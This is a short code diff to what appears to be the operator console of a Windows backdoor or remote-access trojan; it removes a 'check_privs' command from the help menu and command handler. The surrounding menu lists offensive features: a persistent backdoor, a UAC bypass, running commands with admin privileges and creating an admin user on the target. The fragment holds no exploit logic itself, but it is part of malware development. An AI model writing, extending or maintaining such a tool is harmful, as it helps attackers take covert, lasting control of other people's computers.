@@ -90,7 +90,6 @@ def target_communication():
     print("   start_persistence      - Start persistent backdoor (stays running permanently)")
     print("")
     print("PRIVILEGE ESCALATION:")
-    print("   check_privs            - Check current privilege level")
     print("   escalate               - Perform UAC bypass")
     print("   elevate <command>      - Execute command with admin privileges")
     print("   create_admin           - Create admin user")
@@ -219,7 +218,7 @@ def target_communication():
             result = reliable_recv()
             if command == 'start_persistence':
                 print(f"Persistence: {result}")
-        elif command in ['check_privs', 'escalate', 'create_admin']:
+        elif command in ['escalate', 'create_admin']:
             # Handle privilege escalation commands
             result = reliable_recv()
             print(result)
